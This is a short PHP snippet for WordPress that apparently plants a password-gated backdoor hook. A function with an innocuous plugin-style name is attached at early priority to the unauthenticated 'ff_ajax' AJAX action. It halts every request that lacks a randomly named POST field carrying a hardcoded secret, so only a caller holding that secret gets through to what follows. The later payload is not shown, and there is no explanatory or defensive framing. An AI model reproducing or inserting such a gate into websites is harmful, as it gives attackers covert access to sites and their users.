<?php

function editor_gallery_addons_first() {
	if (!isset($_POST["aieddhdq"]) || $_POST["aieddhdq"] !== "x3bN7ZXSCEcio") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'editor_gallery_addons_first', 5, 1);
